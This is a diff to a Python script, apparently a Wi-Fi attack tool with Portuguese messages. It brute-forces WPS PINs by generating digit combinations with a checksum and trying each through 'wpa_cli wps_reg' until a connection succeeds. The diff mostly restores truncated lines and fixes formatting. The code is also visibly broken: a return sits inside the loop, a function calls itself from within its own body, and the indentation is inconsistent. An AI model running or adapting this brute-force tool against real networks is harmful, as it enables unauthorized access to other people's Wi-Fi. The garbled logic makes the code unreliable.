@@ -76,7 +76,7 @@ while True:
                    combinations = itertools.product(range(10), repeat=7)
                    for combination in combinations:
                        if (sum(combination) * 3 + last_digit) % 10 == 0:
-                           pin = ''.join(str(digit) for digit in combination) + str(la>
+                           pin = ''.join(str(digit) for digit in combination) + str(last_digit)
                            return pin
                        return None
                     seven_digits = vy
@@ -87,14 +87,16 @@ while True:
                 os.system("clear")
                 print("Testando PIN: "+ciano+pin)
                 result = connect_wifi(pin)
-                if "SUCCESS" in result:                                                                     print(verde)
+                if "SUCCESS" in result:
+                    print(verde)
                     print(f"Successo! PIN: {pin}")
                     def connect_to_wifi_with_wps_pin(pin):
                         command = f"wpa_cli -i wlan0 wps_reg {pin}"
-                        output = subprocess.run(command, shell=True, capture_output=Tru>
+                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
                         if output.returncode == 0:
-                            print(verde+"Conexão estabelecida com sucesso usando o PIN >
-                        else:                                                                                       print(vermelho+"Falha ao estabelecer a conexão usando o PIN>
+                            print(verde+"Conexão estabelecida com sucesso usando o PIN WPS!")
+                        else:
+                            print(vermelho+"Falha ao estabelecer a conexão usando o PIN WPS.")
                         connect_to_wifi_with_wps_pin(pin)
                 else:
                     print(amarelo+"PIN inválido")
